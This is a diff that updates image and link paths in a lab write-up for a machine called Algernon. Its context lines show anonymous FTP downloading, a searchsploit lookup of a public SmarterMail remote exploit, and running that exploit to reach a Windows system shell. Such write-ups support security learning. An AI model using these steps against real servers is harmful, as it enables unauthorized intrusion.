@@ -85,9 +85,9 @@
 - `wget -r ftp://anonymous:anonymous@192.168.116.65` Nothing interesting in those files after Downloading them 
 
 ## Exploitation
-![Website](/images/smartermail.png)
+![Website](/2.Algernon/images/smartermail.png)
 - As SQL injection was not possible in Admin portal.
-<br>![Adminportal](/images/Admin_portal.png) 
+<br>![Adminportal](/2.Algernon/images/Admin_portal.png) 
 
 ```text
 searchsploit smartermail
@@ -119,7 +119,7 @@ searchsploit -m windows/remote/49216.py
 File Type: Python script, ASCII text executable, with very long lines (4852)
 Copied to: /home/G1/Templates/Web/49216.py
 ```
-[exploit.py](/sources/exploit.py)
+[exploit.py](/2.Algernon/sources/exploit.py)
 ```pwsh
 python ./exploit.py
 PS C:\Windows\system32> whoami
